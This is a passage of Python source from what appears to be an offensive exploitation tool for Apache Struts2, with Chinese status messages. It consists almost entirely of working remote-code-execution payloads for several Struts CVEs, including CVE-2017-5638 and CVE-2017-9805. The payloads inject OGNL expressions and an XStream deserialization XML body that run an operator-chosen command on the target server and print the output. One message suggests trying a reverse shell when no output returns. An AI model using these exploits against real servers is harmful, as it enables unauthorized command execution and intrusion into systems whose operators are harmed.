                cve_2013_2251_pay_abc = "?redirect:" + cve_2013_2251_pay_end
                # print(url + cve_2013_2251_pay_abc)
                cve_2013_2251_req = requests.get(url + cve_2013_2251_pay_abc, headers=header, verify=False, timeout=timeout, allow_redirects=False)
                # print(cve_2013_2251_req.headers.get("Location"))
                cve_2013_2251_req_location = cve_2013_2251_req.headers.get("Location")
                cve_2013_2251_req_location_strip = cve_2013_2251_req_location.strip("/")
                print(cve_2013_2251_req_location_strip)
            else :
                print("查看命令是否正确")

        if vul == "CVE-2013-4316" :
            if "?" in urlc:
                # print("aaa")
                url_parameter = urlc.split("?")
                url_parameter_one = url_parameter[0]
                url_parameter_two = url_parameter[1]
                if "&" in url_parameter_two:
                    url_parameter_A = url_parameter_two.split("&")
                    url_parameter_A_A = url_parameter_A[0]
                    url_parameter_A_A_s = url_parameter_A_A.split("=")
                    url_parameter_A_A_A = url_parameter_A_A_s[0]
                    url_parameter_A_A_B = url_parameter_A_A_s[1]

                    url_parameter_A_B = url_parameter_A[1]
                    # print(url_parameter_A_two)
                    url_parameter_A_B_s = url_parameter_A_B.split("=")
                    url_parameter_A_B_A = url_parameter_A_B_s[0]
                    print(url_parameter_A_B_A)


                    if cmd == "path" :
                        cve_2013_4316_pay = "#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),#req=@org.apache.struts2.ServletActionContext@getRequest(),#resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'pwd'})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[1000],#d.read(#e),#resp.println(#e),#resp.close()"
                        cve_2013_4316_pay_end = urllib.parse.quote(cve_2013_4316_pay, "utf-8")
                        cve_2013_4316_pay_and = '''?''' + url_parameter_A_A_A + '''=''' + url_parameter_A_A_B + '''&''' + url_parameter_A_B_A + '''=''' + cve_2013_4316_pay_end

                        cve_2013_4316_req = requests.get(url_parameter_one + cve_2013_4316_pay_and, headers=headers,verify=False, timeout=timeout, stream=True)
                        print(cve_2013_4316_req.text)

                    elif cmd != "" :
                        cmds = cmd
                        cm = shlex.split(cmds)
                        cmd_str = '"' + '","'.join(cm) + '"'
                        cve_2013_4316_pay = "#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),#req=@org.apache.struts2.ServletActionContext@getRequest(),#resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#a=(new java.lang.ProcessBuilder(new java.lang.String[]{" + cmd_str + "})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[1000],#d.read(#e),#resp.println(#e),#resp.close()"
                        cve_2013_4316_pay_end = urllib.parse.quote(cve_2013_4316_pay, "utf-8")
                        cve_2013_4316_pay_and = '''?''' + url_parameter_A_A_A + '''=''' + url_parameter_A_A_B + '''&''' + url_parameter_A_B_A + '''=''' + cve_2013_4316_pay_end

                        cve_2013_4316_req = requests.get(url_parameter_one + cve_2013_4316_pay_and, headers=headers,
                                                         verify=False, timeout=timeout, stream=True)
                        print(cve_2013_4316_req.text)
                    else :
                        print("查看命令是否正确")




                else:
                    if cmd == "path":
                        cve_2013_4316_pay = "#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),#req=@org.apache.struts2.ServletActionContext@getRequest(),#resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'pwd'})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[1000],#d.read(#e),#resp.println(#e),#resp.close()"
                        cve_2013_4316_pay_end = urllib.parse.quote(cve_2013_4316_pay, "utf-8")
                        cve_2013_4316_pay_and = urlc + "&expression=" + cve_2013_4316_pay_end

                        cve_2013_4316_req = requests.get(cve_2013_4316_pay_and ,  headers=headers,
                                                         verify=False, timeout=timeout, stream=True)
                        print(cve_2013_4316_req.text)

                    elif cmd != "":
                        cmds = cmd
                        cm = shlex.split(cmds)
                        cmd_str = '"' + '","'.join(cm) + '"'
                        cve_2013_4316_pay = "#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),#req=@org.apache.struts2.ServletActionContext@getRequest(),#resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#a=(new java.lang.ProcessBuilder(new java.lang.String[]{" + cmd_str + "})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[1000],#d.read(#e),#resp.println(#e),#resp.close()"
                        cve_2013_4316_pay_end = urllib.parse.quote(cve_2013_4316_pay, "utf-8")
                        cve_2013_4316_pay_and = urlc + "&expression=" + cve_2013_4316_pay_end

                        cve_2013_4316_req = requests.get(cve_2013_4316_pay_and, headers=headers,
                                                         verify=False, timeout=timeout, stream=True)
                        print(cve_2013_4316_req.text)
                    else :
                        print("查看命令是否正确")


            else:
                if scan_url["filename"] == "":
                    url = scan_url["site"] + scan_url["file_path"] + "/index.action"

                if cmd == "path":
                    cve_2013_4316_pay = "#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),#req=@org.apache.struts2.ServletActionContext@getRequest(),#resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'pwd'})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[1000],#d.read(#e),#resp.println(#e),#resp.close()"
                    cve_2013_4316_pay_end = urllib.parse.quote(cve_2013_4316_pay, "utf-8")
                    cve_2013_4316_pay_and = url + "?debug=command&expression=" + cve_2013_4316_pay_end

                    cve_2013_4316_req = requests.get(cve_2013_4316_pay_and, headers=headers, verify=False, timeout=timeout, stream=True)
                    print(cve_2013_4316_req.text)

                elif cmd != "":
                    cmds = cmd
                    cm = shlex.split(cmds)
                    cmd_str = '"' + '","'.join(cm) + '"'
                    cve_2013_4316_pay = "#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),#req=@org.apache.struts2.ServletActionContext@getRequest(),#resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#a=(new java.lang.ProcessBuilder(new java.lang.String[]{" + cmd_str + "})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[1000],#d.read(#e),#resp.println(#e),#resp.close()"
                    cve_2013_4316_pay_end = urllib.parse.quote(cve_2013_4316_pay, "utf-8")
                    cve_2013_4316_pay_and = url + "?debug=command&expression=" + cve_2013_4316_pay_end

                    cve_2013_4316_req = requests.get(cve_2013_4316_pay_and, headers=headers,verify=False, timeout=timeout, stream=True)
                    print(cve_2013_4316_req.text)
                else:
                    print("查看命令是否正确")

        if vul == "CVE-2016-0785" :
            if "?" in urlc:
                # print("aaa")
                url_parameter = urlc.split("?")
                url_parameter_one = url_parameter[0]
                url_parameter_two = url_parameter[1]
                url_parameter_tree = url_parameter_two.split("=")
                url_parameter_four = url_parameter_tree[0]

                if cmd == "path" :
                    cve_2016_0785_pay = "(#_memberAccess['allowPrivateAccess']=true,#_memberAccess['allowProtectedAccess']=true,#_memberAccess['excludedPackageNamePatterns']=#_memberAccess['acceptProperties'],#_memberAccess['excludedClasses']=#_memberAccess['acceptProperties'],#_memberAccess['allowPackageProtectedAccess']=true,#_memberAccess['allowStaticMethodAccess']=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('pwd').getInputStream()))"
                    cve_2016_0785_pay_end = urllib.parse.quote(cve_2016_0785_pay, "utf-8")
                    # print(cve_2016_0785_pay_end)
                    cve_2016_0785_pay_and = url_parameter_one + '''?''' + url_parameter_four + '''=''' + cve_2016_0785_pay_end
                    cve_2016_0785_pay_and_req = requests.get(cve_2016_0785_pay_and, headers=headers, verify=False, timeout=timeout, stream=True)
                    # print(cve_2016_0785_pay_and_req.text)
                    cve_2016_0785_pay_text = cve_2016_0785_pay_and_req.text
                    # print(cve_2012_0838_text)
                    etree_res = etree.HTML(cve_2016_0785_pay_text)
                    # result = etree_res.xpath('//*/@value')
                    cve_2016_0785_pay_xpth = '//input[@name="' + cve_2016_0785_pay + '"]/@value'
                    # print(cve_2016_0785_pay_xpth)
                    result = etree_res.xpath(cve_2016_0785_pay_xpth)
                    # print(result)
                    str_result = "".join(result)
                    print(str_result)
                elif cmd != "" :
                    cve_2016_0785_pay = "(#_memberAccess['allowPrivateAccess']=true,#_memberAccess['allowProtectedAccess']=true,#_memberAccess['excludedPackageNamePatterns']=#_memberAccess['acceptProperties'],#_memberAccess['excludedClasses']=#_memberAccess['acceptProperties'],#_memberAccess['allowPackageProtectedAccess']=true,#_memberAccess['allowStaticMethodAccess']=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('" + cmd + "').getInputStream()))"
                    cve_2016_0785_pay_end = urllib.parse.quote(cve_2016_0785_pay, "utf-8")
                    # print(cve_2016_0785_pay_end)
                    cve_2016_0785_pay_and = url_parameter_one + '''?''' + url_parameter_four + '''=''' + cve_2016_0785_pay_end
                    cve_2016_0785_pay_and_req = requests.get(cve_2016_0785_pay_and, headers=headers, verify=False,
                                                             timeout=timeout, stream=True)
                    # print(cve_2016_0785_pay_and_req.text)
                    cve_2016_0785_pay_text = cve_2016_0785_pay_and_req.text
                    # print(cve_2012_0838_text)
                    etree_res = etree.HTML(cve_2016_0785_pay_text)
                    # result = etree_res.xpath('//*/@value')
                    cve_2016_0785_pay_xpth = '//input[@name="' + cve_2016_0785_pay + '"]/@value'
                    # print(cve_2016_0785_pay_xpth)
                    result = etree_res.xpath(cve_2016_0785_pay_xpth)
                    # print(result)
                    str_result = "".join(result)
                    print(str_result)
                else :
                    print("查看命令是否正确")

            else:
                if scan_url["filename"] == "":
                    url = scan_url["site"] + scan_url["file_path"] + "default.action"

                if cmd == "path" :
                    cve_2016_0785_pay = "(#_memberAccess['allowPrivateAccess']=true,#_memberAccess['allowProtectedAccess']=true,#_memberAccess['excludedPackageNamePatterns']=#_memberAccess['acceptProperties'],#_memberAccess['excludedClasses']=#_memberAccess['acceptProperties'],#_memberAccess['allowPackageProtectedAccess']=true,#_memberAccess['allowStaticMethodAccess']=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('pwd').getInputStream()))"
                    cve_2016_0785_pay_end = urllib.parse.quote(cve_2016_0785_pay, "utf-8")
                    cve_2016_0785_pay_and = url + "?message=" + cve_2016_0785_pay_end

                    cve_2016_0785_pay_and_req = requests.get(cve_2016_0785_pay_and, headers=headers, verify=False,
                                                             timeout=timeout, stream=True)
                    cve_2016_0785_pay_text = cve_2016_0785_pay_and_req.text
                    # print(cve_2012_0838_text)
                    etree_res = etree.HTML(cve_2016_0785_pay_text)
                    # result = etree_res.xpath('//*/@value')
                    cve_2016_0785_pay_xpth = '//input[@name="' + cve_2016_0785_pay + '"]/@value'
                    # print(cve_2016_0785_pay_xpth)
                    result = etree_res.xpath(cve_2016_0785_pay_xpth)
                    # print(result)
                    str_result = "".join(result)
                    print(str_result)
                elif cmd != "" :
                    cve_2016_0785_pay = "(#_memberAccess['allowPrivateAccess']=true,#_memberAccess['allowProtectedAccess']=true,#_memberAccess['excludedPackageNamePatterns']=#_memberAccess['acceptProperties'],#_memberAccess['excludedClasses']=#_memberAccess['acceptProperties'],#_memberAccess['allowPackageProtectedAccess']=true,#_memberAccess['allowStaticMethodAccess']=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('" + cmd + "').getInputStream()))"
                    cve_2016_0785_pay_end = urllib.parse.quote(cve_2016_0785_pay, "utf-8")
                    cve_2016_0785_pay_and = url + "?message=" + cve_2016_0785_pay_end

                    cve_2016_0785_pay_and_req = requests.get(cve_2016_0785_pay_and, headers=headers, verify=False,
                                                             timeout=timeout, stream=True)
                    cve_2016_0785_pay_text = cve_2016_0785_pay_and_req.text
                    # print(cve_2012_0838_text)
                    etree_res = etree.HTML(cve_2016_0785_pay_text)
                    # result = etree_res.xpath('//*/@value')
                    cve_2016_0785_pay_xpth = '//input[@name="' + cve_2016_0785_pay + '"]/@value'
                    # print(cve_2016_0785_pay_xpth)
                    result = etree_res.xpath(cve_2016_0785_pay_xpth)
                    # print(result)
                    str_result = "".join(result)
                    print(str_result)
                else :
                    print("查看命令是否正确")

        if vul == "CVE-2016-3081" :
            if scan_url["filename"] == "":
                url = scan_url["site"] + scan_url["file_path"] + "index.action"
            if cmd == "path" :
                cve_2016_3081_pay = "?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=pwd"
                # print(cve_2016_3081_pay)
                cve_2016_3081_pay_and = url + cve_2016_3081_pay
                cve_2016_3081_pay_and_req = requests.get(cve_2016_3081_pay_and, headers=headers, verify=False, timeout=timeout)
                print(cve_2016_3081_pay_and_req.text)
            elif cmd != "" :
                cve_2016_3081_pay = "?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=" + cmd
                # print(cve_2016_3081_pay)
                cve_2016_3081_pay_and = url + cve_2016_3081_pay
                cve_2016_3081_pay_and_req = requests.get(cve_2016_3081_pay_and, headers=headers, verify=False,
                                                         timeout=timeout)
                print(cve_2016_3081_pay_and_req.text)
            else :
                print("查看命令是否正确")

        if vul == "CVE-2017-5638" :
            time.sleep(5)
            if scan_url["filename"] == "":
                url = scan_url["site"] + scan_url["file_path"] + "doUpload.action"
            if cmd == "path" :
                cve_2017_5638_pay = '''"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='pwd').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"'''
                cve_2017_5638_header = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
                    "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ,
                    "Accept-Language" : "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2" ,
                    "Accept-Encoding" : "gzip, deflate" ,
                    "Content-Type": cve_2017_5638_pay}
                cve_2017_5638_req = requests.post(url, headers=cve_2017_5638_header, verify=False, timeout=timeout)
                print(cve_2017_5638_req.text)
            elif cmd != "" :
                cve_2017_5638_pay = '''"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\'''' + cmd + '''\').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"'''
                cve_2017_5638_header = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Type": cve_2017_5638_pay}
                cve_2017_5638_req = requests.post(url, headers=cve_2017_5638_header, verify=False, timeout=timeout)
                print(cve_2017_5638_req.text)
            else :
                print("查看命令是否正确")


        if vul == "CVE-2017-9791" :
            if scan_url["filename"] == "":
                url = scan_url["site"] + scan_url["file_path"] + "integration/saveGangster.action"
            if cmd == "path" :
                cve_2017_9791_pay = {"name": "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('pwd').getInputStream())).(#q)}",
                                     "age": "1",
                                     "bustedBefore": "true",
                                     "__checkbox_bustedBefore": "true",
                                     "description": "1"}
                cve_2017_9791_pay_header = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Upgrade-Insecure-Requests": "1"}
                cve_2017_9791_pay_req = requests.post(url, headers=cve_2017_9791_pay_header, data=cve_2017_9791_pay,
                                                      verify=False, timeout=timeout)
                # print(cve_2017_9791_pay_req.text)
                etree_res = etree.HTML(cve_2017_9791_pay_req.text)
                cve_2017_9791_pay_result = etree_res.xpath('//*[@id="page-home"]/div[3]/div/div/ul/li/span/text()')
                # print(cve_2017_9791_pay_result)
                cve_2017_9791_pay_str_result = "".join(cve_2017_9791_pay_result)
                # print(cve_2017_9791_pay_str_result)
                cve_2017_9791_f = re.sub(r'Gangster ', '', cve_2017_9791_pay_str_result)
                cve_2017_9791_f_a = re.sub(r' added successfully', '', cve_2017_9791_f)
                print(cve_2017_9791_f_a)
            elif cmd != "" :
                cve_2017_9791_name = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('" + cmd + "').getInputStream())).(#q)}"
                cve_2017_9791_pay = {
                    "name": cve_2017_9791_name,
                    "age": "1",
                    "bustedBefore": "true",
                    "__checkbox_bustedBefore": "true",
                    "description": "1"}
                cve_2017_9791_pay_header = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Upgrade-Insecure-Requests": "1"}
                cve_2017_9791_pay_req = requests.post(url, headers=cve_2017_9791_pay_header, data=cve_2017_9791_pay,
                                                      verify=False, timeout=timeout)
                # print(cve_2017_9791_pay_req.text)
                etree_res = etree.HTML(cve_2017_9791_pay_req.text)
                cve_2017_9791_pay_result = etree_res.xpath('//*[@id="page-home"]/div[3]/div/div/ul/li/span/text()')
                # print(cve_2017_9791_pay_result)
                cve_2017_9791_pay_str_result = "".join(cve_2017_9791_pay_result)
                # print(cve_2017_9791_pay_str_result)
                cve_2017_9791_f = re.sub(r'Gangster ', '', cve_2017_9791_pay_str_result)
                cve_2017_9791_f_a = re.sub(r' added successfully', '', cve_2017_9791_f)
                print(cve_2017_9791_f_a)
            else :
                print("查看命令是否正确")

        if vul == "CVE-2017=9805" :
            if scan_url["filename"] == "":
                url = scan_url["site"] + scan_url["file_path"] + "orders/3"
            if cmd != "" :
                cmds = shlex.split(cmd)
                # print(cmds)
                cve_2017_9805_cmd_str = '<string>' + '</string>\n<string>'.join(cmds) + '</string>'
                cve_2017_9805_data = '''<map>
                                                    <entry>
                                                         <jdk.nashorn.internal.objects.NativeString>
                                                           <flags>0</flags>
                                                           <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
                                                             <dataHandler>
                                                               <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
                                                                 <is class="javax.crypto.CipherInputStream">
                                                                   <cipher class="javax.crypto.NullCipher">
                                                                     <initialized>false</initialized>
                                                                     <opmode>0</opmode>
                                                                     <serviceIterator class="javax.imageio.spi.FilterIterator">
                                                                       <iter class="javax.imageio.spi.FilterIterator">
                                                                         <iter class="java.util.Collections$EmptyIterator"/>
                                                                         <next class="java.lang.ProcessBuilder">
                                                                           <command>
                                                                                ''' + cve_2017_9805_cmd_str + '''
                                                                           </command>
                                                                           <redirectErrorStream>false</redirectErrorStream>
                                                                         </next>
                                                                       </iter>
                                                                       <filter class="javax.imageio.ImageIO$ContainsFilter">
                                                                         <method>
                                                                           <class>java.lang.ProcessBuilder</class>
                                                                           <name>start</name>
                                                                           <parameter-types/>
                                                                         </method>
                                                                         <name>foo</name>
                                                                       </filter>
                                                                       <next class="string">foo</next>
                                                                     </serviceIterator>
                                                                     <lock/>
                                                                   </cipher>
                                                                   <input class="java.lang.ProcessBuilder$NullInputStream"/>
                                                                   <ibuffer/>
                                                                   <done>false</done>
                                                                   <ostart>0</ostart>
                                                                   <ofinish>0</ofinish>
                                                                   <closed>false</closed>
                                                                 </is>
                                                                 <consumed>false</consumed>
                                                               </dataSource>
                                                               <transferFlavors/>
                                                             </dataHandler>
                                                             <dataLen>0</dataLen>
                                                           </value>
                                                         </jdk.nashorn.internal.objects.NativeString>
                                                         <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
                                                       </entry>
                                                       <entry>
                                                         <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
                                                         <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
                                                       </entry>
                                                     </map>'''
                cve_2017_9805_header = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Type": "application/xml",
                    "Upgrade-Insecure-Requests": "1"}
                cve_2017_9805_req = requests.post(url, headers=cve_2017_9805_header, data=cve_2017_9805_data,
                                                  verify=False, timeout=timeout)
                etree_res = etree.HTML(cve_2017_9805_req.text)
                cve_2017_9805_result = etree_res.xpath('/html/body/h1/text()')
                # print(cve_2017_9791_pay_result)
                cve_2017_9805_str_result = "".join(cve_2017_9805_result)
                if 500 == cve_2017_9805_req.status_code and "HTTP Status 500 – Internal Server Error" in cve_2017_9805_str_result :
                    print("此漏洞无回显，请尝试创建文件和反弹shell！")
            else :
                print("查看命令是否正确")

        if vul == "CVE-2017-12611" :
            if scan_url["filename"] == "":
                url = scan_url["site"] + scan_url["file_path"] + "hello.action"
            if cmd == "path" :
                cve_2017_12611_header = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Upgrade-Insecure-Requests": "1"}
                cve_2017_12611_data = {
                    "redirectUri": "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='pwd').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}\n"}
                cve_2017_12611_req = requests.post(url, headers=cve_2017_12611_header, data=cve_2017_12611_data, verify=False, timeout=timeout)
                # print(cve_2017_12611_req.text)
                etree_res = etree.HTML(cve_2017_12611_req.text)
                cve_2017_12611_result = etree_res.xpath('/html/body/p/text()')
                cve_2017_12611_str_result = "".join(cve_2017_12611_result)
                # print(cve_2017_12611_str_result)
                cve_2017_12611_f = re.sub(r'Your url: ', '', cve_2017_12611_str_result)
                print(cve_2017_12611_f)
            elif cmd != "" :
                cve_2017_12611_header = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Upgrade-Insecure-Requests": "1"}
                cve_2017_12611_pay = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='" + cmd + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}\n"
                cve_2017_12611_data = {
